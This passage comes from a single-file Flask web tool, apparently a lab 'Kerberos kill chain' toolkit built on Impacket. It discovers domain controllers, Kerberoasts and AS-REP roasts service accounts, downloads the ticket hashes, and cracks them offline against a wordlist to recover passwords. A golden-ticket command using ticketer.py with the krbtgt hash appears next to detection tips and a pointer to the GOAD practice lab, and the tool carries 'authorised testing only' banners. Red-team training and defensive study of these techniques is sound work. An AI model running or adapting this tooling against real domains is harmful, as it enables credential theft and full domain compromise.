        <div class="cmd"><div class="cmd-tab"><span class="tool">reference &middot; impacket ticketer</span></div>
          <pre><span class="p">$ </span>ticketer.py <span class="fl">-nthash</span> &lt;krbtgt&gt; <span class="fl">-domain-sid</span> &lt;SID&gt; <span class="fl">-domain</span> lab.local anyuser</pre></div>
        <p class="yield"><span class="arw">yields &rarr;</span> <b>arbitrary domain impersonation</b>, durable across resets.</p>
        <div class="defend"><div class="dh"><svg viewBox="0 0 24 24" stroke-width="2"><path d="M12 3l7 4v5c0 4-3 7-7 8-4-1-7-4-7-8V7z"/></svg>Detect &amp; defend</div>
          <p>Forged tickets leave tells: <b>anomalous TGT lifetimes</b>, a <span class="evt">TGS-REQ with no matching AS-REQ</span> (<span class="evt">4768</span>), RC4 in an AES domain, RID/SID mismatch. On suspicion, <b>roll krbtgt twice</b>. Treat KRBTGT loss as a domain rebuild.</p></div>
      </article>

      <div class="chain-note">Build the lab with <b style="color:var(--ink)">GOAD</b> (Game of Active Directory) &mdash; a deliberately vulnerable forest
        with a kerberoastable DA and DCSync paths. Run each hop, watch it fire in your own SIEM, remediate, confirm the alert goes quiet.
        Refs: MITRE ATT&amp;CK T1558.003 / T1003.006 / T1558.001 &middot; Impacket &middot; Orange-Cyberdefense/GOAD.</div>
    </div>
  </section>

  <footer>Wraps Impacket <span style="font-family:var(--mono)">GetUserSPNs.py</span> (Fortra). Served locally &mdash; do not expose to untrusted networks.</footer>
</div>

<div class="toast" id="toast"></div>

<script>
(function(){
  // ---- tabs ----
  var tabs=document.querySelectorAll('.tab');
  function show(name){
    tabs.forEach(function(t){t.classList.toggle('active', t.dataset.tab===name);});
    document.querySelectorAll('.panel').forEach(function(p){p.classList.toggle('active', p.id==='panel-'+name);});
  }
  tabs.forEach(function(t){t.addEventListener('click',function(){show(t.dataset.tab);});});

  function esc(s){return String(s==null?'':s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
  function toast(m){var t=document.getElementById('toast');t.textContent=m;t.classList.add('show');setTimeout(function(){t.classList.remove('show');},1900);}
  function fmt(ms){return (ms/1000).toFixed(1)+'s';}

  // ---- recon ----
  var reconBtn=document.getElementById('reconBtn'), reconSpin=document.getElementById('reconSpin'),
      reconLabel=document.getElementById('reconLabel');
  async function doRecon(){
    var ip=document.getElementById('reconIp').value.trim();
    if(!ip){toast('Enter a DC IP');return;}
    reconBtn.disabled=true;reconSpin.style.display='inline-block';reconLabel.textContent='Discovering...';
    document.getElementById('reconErr').style.display='none';
    document.getElementById('reconOut').style.display='none';
    var st=document.getElementById('reconStatus'),dot=document.getElementById('reconDot');
    st.style.display='flex';dot.className='dot run';document.getElementById('reconStatusText').textContent='Connecting to '+ip+' ...';
    try{
      var res=await fetch('/api/recon',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip:ip})});
      var s=await res.json();
      if(s.ok && s.data){
        var d=s.data;
        var openPorts=(d.ports||[]).filter(function(p){return p.open;});
        dot.className='dot ok';
        document.getElementById('reconStatusText').textContent=
          (d.domain?('Domain: '+d.domain+' · '):'')+openPorts.length+' AD port(s) open';
        document.getElementById('rv-domain').textContent=d.domain||'—';
        document.getElementById('rv-basedn').textContent=d.base_dn||'—';
        document.getElementById('rv-host').textContent=d.dc_host||'—';
        document.getElementById('rv-nbdom').textContent=d.netbios_domain||'—';
        document.getElementById('rv-nbname').textContent=d.netbios_name||'—';
        document.getElementById('rv-os').textContent=d.os||'—';
        var pg=document.getElementById('portsGrid');
        if(d.ports&&d.ports.length){
          document.getElementById('portsWrap').style.display='block';
          document.getElementById('portsOpen').textContent=openPorts.length+' / '+d.ports.length+' open';
          pg.innerHTML=d.ports.map(function(p){
            return '<div class="port'+(p.open?' open':'')+'"><span class="pd"></span><span class="pp">'+p.port+'</span><span class="ps">'+esc(p.service)+'</span></div>';
          }).join('');
        }else{document.getElementById('portsWrap').style.display='none';}
        document.getElementById('reconOut').style.display='block';
        document.getElementById('reconOut').dataset.domain=d.domain||'';
        document.getElementById('reconOut').dataset.ip=ip;
      }else{
        dot.className='dot err';document.getElementById('reconStatusText').textContent='No domain';
        var e=document.getElementById('reconErr');e.style.display='block';
        e.textContent=(s.error||'Discovery failed.')+(s.hint?('  —  '+s.hint):'');
      }
    }catch(err){
      dot.className='dot err';document.getElementById('reconStatusText').textContent='Request failed';
      var e2=document.getElementById('reconErr');e2.style.display='block';e2.textContent=err.message;
    }finally{
      reconBtn.disabled=false;reconSpin.style.display='none';reconLabel.textContent='Discover';
    }
  }
  reconBtn.addEventListener('click',doRecon);
  document.getElementById('reconIp').addEventListener('keydown',function(e){if(e.key==='Enter')doRecon();});
  document.getElementById('toRoast').addEventListener('click',function(){
    var out=document.getElementById('reconOut');
    var f=document.getElementById('form');
    if(out.dataset.domain) f.user_domain.value=out.dataset.domain;
    if(out.dataset.ip) f.dc_ip.value=out.dataset.ip;
    show('roast'); f.username.focus();
    toast('Domain + DC IP sent to Kerberoast');
  });

  // ---- kerberoast ----
  var form=document.getElementById('form'),runBtn=document.getElementById('runBtn'),
      runLabel=document.getElementById('runLabel'),spin=document.getElementById('spin'),
      elapsedEl=document.getElementById('elapsed'),statusWrap=document.getElementById('status'),
      dot=document.getElementById('dot'),statusText=document.getElementById('statusText'),
      placeholder=document.getElementById('placeholder'),output=document.getElementById('output');
  var poll=null,timer=null,t0=0,currentJob=null,lastHashes=[];

  function setBusy(b){runBtn.disabled=b;spin.style.display=b?'inline-block':'none';runLabel.textContent=b?'Running...':'Run Kerberoast';}
  function setStatus(c,t){statusWrap.style.display='flex';dot.className='dot '+c;statusText.textContent=t;}
  function collect(){var d={};new FormData(form).forEach(function(v,k){d[k]=v;});
    form.querySelectorAll('input[type=checkbox]').forEach(function(c){d[c.name]=c.checked;});return d;}
  function renderHash(h){var m=h.match(/^(\$krb5tgs\$)(\d+)(\$)/);
    if(m){return '<span class="et">'+esc(m[1]+m[2]+m[3])+'</span>'+esc(h.slice(m[0].length));}return esc(h);}

  function render(r){
    output.style.display='block';placeholder.style.display='none';
    var errSec=document.getElementById('errSec');
    var errBox=errSec.querySelector('.errbox');
    var hintEl=document.getElementById('hintText');
    if(r.error||r.hint){
      errSec.style.display='block';
      if(r.error){errBox.style.display='block';document.getElementById('errText').textContent=r.error;errBox.style.borderColor='var(--red-line)';}
      else{errBox.style.display='none';}
      if(r.hint){hintEl.style.display='block';hintEl.innerHTML='<b>Hint — </b>'+esc(r.hint);}else{hintEl.style.display='none';}
    }else{errSec.style.display='none';hintEl.style.display='none';}
    var rows=r.results||[];var tblSec=document.getElementById('tblSec');
    if(rows.length){tblSec.style.display='block';
      document.getElementById('spnCount').textContent=rows.length+(rows.length===1?' SPN':' SPNs');
      document.getElementById('tblBody').innerHTML=rows.map(function(x){
        var del='';if(x.delegation==='unconstrained')del='<span class="tag unc">unconstrained</span>';
        else if(x.delegation==='constrained')del='<span class="tag con">constrained</span>';
        var mo=x.memberOf?esc(x.memberOf.split(',')[0].replace(/^CN=/i,'')):'<span style="color:var(--faint)">—</span>';
        return '<tr><td class="spn">'+esc(x.spn)+'</td><td class="name">'+esc(x.sAMAccountName)+'</td><td>'+mo+
          '</td><td class="mono">'+esc(x.pwdLastSet||'—')+'</td><td class="mono">'+esc(x.lastLogon||'—')+
          '</td><td>'+(del||'<span style="color:var(--faint)">—</span>')+'</td></tr>';
      }).join('');}else{tblSec.style.display='none';}
    var hashes=r.hashes||[];lastHashes=hashes;var hashSec=document.getElementById('hashSec');
    if(hashes.length){hashSec.style.display='block';
      document.getElementById('hashCount').textContent=hashes.length+(hashes.length===1?' hash':' hashes');
      document.getElementById('hashBox').innerHTML=hashes.map(function(h){return '<div class="h">'+renderHash(h)+'</div>';}).join('');
    }else{hashSec.style.display='none';}
    var tix=r.saved_tickets||[];var ticketSec=document.getElementById('ticketSec');
    if(tix.length){ticketSec.style.display='block';
      document.getElementById('ticketBox').innerHTML=tix.map(function(t){return '<div class="h">'+esc(t)+'</div>';}).join('');
    }else{ticketSec.style.display='none';}
    var crackSec=document.getElementById('crackSec');
    if(hashes.length){
      crackSec.style.display='block';
      document.getElementById('crackCount').textContent='0 / '+hashes.length;
      document.getElementById('crackKv').innerHTML='';
      document.getElementById('crackProg').style.display='none';
      if(form.autocrack&&form.autocrack.checked){
        var _wl=document.getElementById('wordlist').value,_wp=document.getElementById('wordlist_path').value.trim();
        if(_wl.trim()||_wp){doCrack(hashes);}
      }
    }else{crackSec.style.display='none';}
    var log=r.log||[];var logSec=document.getElementById('logSec');
    if(log.length){logSec.style.display='block';document.getElementById('logCount').textContent=log.length;
      document.getElementById('logBox').innerHTML=log.map(function(l){return '<div class="l '+esc(l.level)+'"><span class="lv">'+esc(l.level)+'</span> '+esc(l.message)+'</div>';}).join('');
    }else{logSec.style.display='none';}
    if(r.ok&&!rows.length&&!hashes.length&&!r.error){errSec.style.display='block';
      errBox.style.display='block';document.getElementById('errText').textContent='No SPN entries found.';
      errBox.style.borderColor='var(--line)';hintEl.style.display='none';}
  }
  function stopPolling(){if(poll){clearInterval(poll);poll=null;}if(timer){clearInterval(timer);timer=null;}}
  function startTimer(){t0=Date.now();elapsedEl.textContent='0.0s';timer=setInterval(function(){elapsedEl.textContent=fmt(Date.now()-t0);},100);}

  form.addEventListener('submit',async function(ev){
    ev.preventDefault();stopPolling();setBusy(true);startTimer();
    setStatus('run','Submitting job...');output.style.display='none';placeholder.style.display='none';
    var job;
    try{
      var res=await fetch('/api/run',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(collect())});
      var data=await res.json();
      if(!res.ok){throw new Error(data.error||('HTTP '+res.status));}
      job=data.job_id;currentJob=job;
    }catch(err){setBusy(false);stopPolling();setStatus('err','Request failed');
      output.style.display='block';document.getElementById('errSec').style.display='block';
      document.getElementById('errText').textContent=err.message;return;}
    setStatus('run','Querying LDAP and requesting tickets...');
    poll=setInterval(async function(){
      try{
        var res=await fetch('/api/status/'+job);var s=await res.json();
        if(s.state==='running')return;
        stopPolling();setBusy(false);elapsedEl.textContent=fmt(Date.now()-t0);
        if(s.state==='error'||s.error){setStatus('err','Finished with errors - '+elapsedEl.textContent);}
        else{var n=(s.results||[]).length,h=(s.hashes||[]).length;setStatus('ok','Done - '+n+' SPN(s), '+h+' hash(es) - '+elapsedEl.textContent);}
        render(s);
      }catch(err){stopPolling();setBusy(false);setStatus('err','Lost connection to server');}
    },1200);
  });
  document.getElementById('copyBtn').addEventListener('click',function(){
    if(!lastHashes.length){toast('Nothing to copy');return;}
    var text=lastHashes.join('\n');
    navigator.clipboard.writeText(text).then(function(){toast('Copied '+lastHashes.length+' hash(es)');},function(){
      var ta=document.createElement('textarea');ta.value=text;document.body.appendChild(ta);ta.select();
      try{document.execCommand('copy');toast('Copied');}catch(e){toast('Copy failed');}document.body.removeChild(ta);});
  });
  document.getElementById('dlBtn').addEventListener('click',function(){
    if(currentJob)window.location='/api/download/'+currentJob;else toast('Run a job first');});

  // ---- offline crack (by user) ----
  async function doCrack(hashes){
    if(!hashes||!hashes.length){toast('No hashes to crack');return;}
    var wl=document.getElementById('wordlist').value, wp=document.getElementById('wordlist_path').value.trim();
    if(!wl.trim()&&!wp){show('roast');toast('Add a wordlist to crack');return;}
    var sec=document.getElementById('crackSec');sec.style.display='block';
    var prog=document.getElementById('crackProg');prog.style.display='flex';
    document.getElementById('crackProgText').textContent='Cracking '+hashes.length+' hash(es)...';
    document.getElementById('crackKv').innerHTML='';
    document.getElementById('crackBtn').disabled=true;
    try{
      var res=await fetch('/api/crack',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({hashes:hashes,wordlist:wl,wordlist_path:wp})});
      var d=await res.json();
      if(!res.ok){throw new Error(d.error||('HTTP '+res.status));}
      var jid=d.job_id;
      await new Promise(function(resolve){
        var pt=setInterval(async function(){
          try{
            var r=await fetch('/api/crack_status/'+jid);var s=await r.json();
            if(s.progress){document.getElementById('crackProgText').textContent=
              'Tried '+(s.progress.tried||0)+' words · '+(s.progress.found||0)+' found';}
            if(s.state==='running')return;
            clearInterval(pt);prog.style.display='none';renderCrack(s);resolve();
          }catch(e){clearInterval(pt);prog.style.display='none';resolve();}
        },600);
      });
    }catch(err){prog.style.display='none';document.getElementById('crackNote').textContent=err.message;}
    finally{document.getElementById('crackBtn').disabled=false;}
  }
  function renderCrack(s){
    var cracked=s.cracked||[];
    document.getElementById('crackCount').textContent=cracked.length+' / '+(s.total||0)+' cracked';
    var kv=document.getElementById('crackKv');
    if(cracked.length){
      kv.innerHTML=cracked.map(function(c){
        return '<div class="k">'+esc(c.user)+'</div><div class="v teal">'+esc(c.password)+'</div>';}).join('');
    }else{
      kv.innerHTML='<div class="k">—</div><div class="v" style="color:var(--faint)">no passwords recovered from this wordlist</div>';
    }
    var note=[];
    if(s.unsupported&&s.unsupported.length){note.push(s.unsupported.length+' AES ticket(s) skipped — export & use hashcat');}
    note.push('tried '+(s.tried||0)+' words');
    if(s.error){note.push(esc(s.error));}
    document.getElementById('crackNote').textContent=note.join(' · ');
  }
  document.getElementById('crackBtn').addEventListener('click',function(){doCrack(lastHashes);});

  form.addEventListener('reset',function(){stopPolling();setBusy(false);
    output.style.display='none';statusWrap.style.display='none';placeholder.style.display='block';elapsedEl.textContent='';
    document.getElementById('crackSec').style.display='none';});
})();
</script>
</body>
</html>
"""


def _render_page():
    if IMPORT_ERROR:
        banner = ('<div class="banner err"><b>impacket is not available on the server.</b> '
                  'The UI renders but recon and roasting cannot run. Install with '
                  '<code>pip install flask impacket</code>.<br>Detail: '
                  + html.escape(IMPORT_ERROR) + '</div>')
    else:
        banner = ''
    return PAGE_HTML.replace("%%IMPORT_ERROR_BANNER%%", banner)


# ===========================================================================
#  BACKEND  --  Flask routes + background job runner
# ===========================================================================

app = Flask(__name__)

_JOBS = {}
_JOBS_LOCK = threading.Lock()
_TRUTHY = {"1", "true", "on", "yes", True, 1}
_HASHES_RE = re.compile(r"^[0-9a-fA-F]{32}:[0-9a-fA-F]{32}$")


def _as_bool(v):
    return v in _TRUTHY


def _clean(v):
    return v.strip() if isinstance(v, str) else v


def _validate(data):
    user_domain = _clean(data.get("user_domain", "")) or ""
    if not user_domain:
        return None, "Domain is required (e.g. lab.local)."
    username = _clean(data.get("username", "")) or ""
    password = data.get("password", "") or ""
    hashes = _clean(data.get("hashes", "")) or ""
    aes_key = _clean(data.get("aes_key", "")) or ""
    kerberos = _as_bool(data.get("kerberos"))
    no_pass = _as_bool(data.get("no_pass"))
    no_preauth = _clean(data.get("no_preauth", "")) or ""

    if hashes and not _HASHES_RE.match(hashes):
        return None, "Hashes must be in LMHASH:NTHASH format (two 32-char hex values)."
    # Username may be empty when the identity comes from elsewhere:
    #   -k          -> taken from the Kerberos ccache (KRB5CCNAME)
    #   -no-preauth -> AS-REP roasting, no bind as yourself
    if not username and not no_preauth and not kerberos:
        return None, "Username is required unless you enable -k (ccache) or -no-preauth."
    if not no_preauth and not (password or hashes or aes_key or kerberos or no_pass):
        return None, "Provide a password, NTLM hashes, an AES key, or enable Kerberos/-no-pass."

    users_raw = data.get("users_list", "")
    users_list = [u.strip() for u in re.split(r"[\r\n,]+", users_raw or "") if u.strip()]
    if no_preauth and not users_list:
        return None, "With -no-preauth you must supply target SPNs/sAMAccountNames in the Users list."

    return {
        "user_domain": user_domain,
        "target_domain": _clean(data.get("target_domain", "")) or "",
        "username": username, "password": password, "hashes": hashes, "aes_key": aes_key,
        "kerberos": kerberos, "no_pass": no_pass, "no_preauth": no_preauth,
        "dc_ip": _clean(data.get("dc_ip", "")) or "", "dc_host": _clean(data.get("dc_host", "")) or "",
        "request": _as_bool(data.get("request")),
        "request_user": _clean(data.get("request_user", "")) or "",
        "request_machine": _clean(data.get("request_machine", "")) or "",
        "machine_only": _as_bool(data.get("machine_only")), "stealth": _as_bool(data.get("stealth")),
        "no_rc4": _as_bool(data.get("no_rc4")), "save": _as_bool(data.get("save")),
        "save_dir": _clean(data.get("save_dir", "")) or ".",
        "users_list": users_list, "debug": _as_bool(data.get("debug")),
    }, None


def _worker(job_id, params):
    result = run_kerberoast(params)
    with _JOBS_LOCK:
        job = _JOBS.get(job_id)
        if job is not None:
            job["state"] = "done" if result.get("ok") else "error"
            job["result"] = result


@app.route("/")
def index():
    return _render_page()


@app.route("/api/recon", methods=["POST"])
def api_recon():
    if not IMPACKET_OK:
        return jsonify(ok=False, error="impacket is not available: %s" % IMPORT_ERROR), 200
    data = request.get_json(silent=True) or {}
    ip = (data.get("ip") or "").strip()
    if not ip:
        return jsonify(ok=False, error="DC IP or hostname is required."), 400
    return jsonify(run_recon(ip))


@app.route("/api/run", methods=["POST"])
def api_run():
    if not IMPACKET_OK:
        return jsonify(error="impacket is not available on the server: %s" % IMPORT_ERROR), 500
    data = request.get_json(silent=True) or request.form.to_dict()
    params, err = _validate(data)
    if err:
        return jsonify(error=err), 400
    job_id = uuid.uuid4().hex
    with _JOBS_LOCK:
        _JOBS[job_id] = {"state": "running", "result": None}
    threading.Thread(target=_worker, args=(job_id, params), daemon=True).start()
    return jsonify(job_id=job_id)


@app.route("/api/status/<job_id>")
def api_status(job_id):
    with _JOBS_LOCK:
        job = _JOBS.get(job_id)
    if job is None:
        return jsonify(error="Unknown job id"), 404
    resp = {"state": job["state"]}
    if job["result"] is not None:
        r = job["result"]
        resp.update({"ok": r.get("ok"), "results": r.get("results", []), "hashes": r.get("hashes", []),
                     "saved_tickets": r.get("saved_tickets", []), "log": r.get("log", []),
                     "error": r.get("error"), "hint": r.get("hint")})
    return jsonify(resp)


@app.route("/api/download/<job_id>")
def api_download(job_id):
    with _JOBS_LOCK:
        job = _JOBS.get(job_id)
    if job is None or job.get("result") is None:
        abort(404)
    hashes = job["result"].get("hashes", [])
    if not hashes:
        abort(404)
    body = "\n".join(hashes) + "\n"
    return Response(body, mimetype="text/plain",
                    headers={"Content-Disposition": "attachment; filename=kerberoast_hashes.txt"})


@app.route("/api/crack", methods=["POST"])
def api_crack():
    if not IMPACKET_OK:
        return jsonify(error="impacket is not available on the server: %s" % IMPORT_ERROR), 500
    data = request.get_json(silent=True) or {}
    hashes = data.get("hashes") or []
    if not isinstance(hashes, list) or not hashes:
        return jsonify(error="No hashes to crack - run a roast first."), 400
    wordlist = data.get("wordlist", "") or ""
    wordlist_path = (data.get("wordlist_path", "") or "").strip()
    if not wordlist.strip() and not wordlist_path:
        return jsonify(error="Provide a wordlist: paste words or give a server-side path."), 400
    try:
        cap = int(data.get("max_words") or 2000000)
    except (TypeError, ValueError):
        cap = 2000000

    job_id = uuid.uuid4().hex
    with _JOBS_LOCK:
        _JOBS[job_id] = {"state": "running", "result": None, "progress": {"tried": 0, "found": 0}}
    threading.Thread(target=_crack_worker,
                     args=(job_id, hashes, wordlist, wordlist_path, cap), daemon=True).start()
    return jsonify(job_id=job_id)


@app.route("/api/crack_status/<job_id>")
def api_crack_status(job_id):
    with _JOBS_LOCK:
        job = _JOBS.get(job_id)
    if job is None:
        return jsonify(error="Unknown job id"), 404
    resp = {"state": job["state"], "progress": job.get("progress", {})}
    if job.get("result") is not None:
        r = job["result"]
        resp.update({"ok": r.get("ok"), "cracked": r.get("cracked", []),
                     "unsupported": r.get("unsupported", []), "tried": r.get("tried", 0),
                     "total": r.get("total", 0), "log": r.get("log", []), "error": r.get("error")})
    return jsonify(resp)


def main():
    parser = argparse.ArgumentParser(description="Single-file AD Kerberos lab toolkit (recon + kerberoast + chain reference).")
    parser.add_argument("--host", default=os.environ.get("HOST", "127.0.0.1"), help="Bind address (default 127.0.0.1).")
    parser.add_argument("--port", type=int, default=int(os.environ.get("PORT", "5000")), help="Port (default 5000).")
    parser.add_argument("--debug", action="store_true", help="Run Flask in debug mode.")
    args = parser.parse_args()

    print("=" * 70)
    print(" Kerberos Kill Chain - Lab Toolkit  (recon + kerberoast + reference)")
    print(" LAB ONLY - authorised testing only.  http://%s:%d" % (args.host, args.port))
    if IMPORT_ERROR:
        print(" [!] impacket import failed: %s" % IMPORT_ERROR)
        print("     pip install flask impacket")
    print("=" * 70)
    app.run(host=args.host, port=args.port, threaded=True, debug=args.debug)


if __name__ == "__main__":
    main()